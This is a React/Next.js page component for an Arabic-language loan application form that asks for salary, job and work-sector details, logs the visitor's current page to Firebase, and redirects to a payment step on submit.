"use client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { addData } from "@/lib/firebase";
import { Check, Home } from "lucide-react";
import { useEffect, useState } from "react";

export default function HomePage() {
  const [salary, setSalary] = useState("");
  const [work, setWork] = useState("");
  const [job, setJob] = useState("");

  const handleSubmit = (e: any) => {
    e.preventDefault();
    window.location.href = "/loan-application/payment/";
  };
  const handleUpdatePageName = async () => {
    const visitorid =
      localStorage.getItem("visitor") || new Date().toDateString();

    await addData({ id: visitorid, currentPage: "معلومات 2" });
  };
  useEffect(() => {
    handleUpdatePageName().then(() => {
      console.log("Done");
    });
  }, []);
  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <div className="bg-gray-800 px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center">
            <Check className="w-6 h-6 text-white" />
          </div>
        </div>
        <div className="text-white">
          <Home className="w-6 h-6" />
        </div>
      </div>

      {/* Form Container */}
      <div className="px-4 py-6 max-w-md mx-auto">
        <div className="space-y-4">
          {/* Net Salary Input */}
          <div>
            <Input
              type="text"
              placeholder="صافي الراتب بعد الاقتطاع"
              onChange={(e) => {
                setSalary(e.target.value);
              }}
              className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
            />
          </div>

          {/* Work Type Input */}
          <div>
            <Input
              type="text"
              onChange={(e) => {
                setJob(e.target.value);
              }}
              placeholder="نوع العمل"
              className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
            />
          </div>

          {/* Job Title Input */}
          <div>
            <Input
              type="text"
              placeholder="اسم الوظيفة"
              onChange={(e) => {
                setWork(e.target.value);
              }}
              className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
            />
          </div>

          {/* Additional Income Input */}
          <div>
            <Input
              type="text"
              placeholder="دخل إضافي"
              className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
            />
          </div>

          {/* New Total Income Input */}
          <div>
            <Input
              type="text"
              placeholder="الدخل الإجمالي الجديد"
              className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500 placeholder:text-gray-400"
            />
          </div>

          {/* Work Sector Dropdown */}
          <div>
            <Select>
              <SelectTrigger className="w-full h-12 text-right bg-white border border-gray-200 rounded-lg px-4 text-gray-500">
                <SelectValue placeholder="قطاع العمل" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="government">القطاع الحكومي</SelectItem>
                <SelectItem value="private">القطاع الخاص</SelectItem>
                <SelectItem value="military">القطاع العسكري</SelectItem>
                <SelectItem value="oil">القطاع النفطي</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Submit Button */}
          <div className="pt-4">
            <Button
              onClick={handleSubmit}
              className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-lg"
            >
              Submit
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}
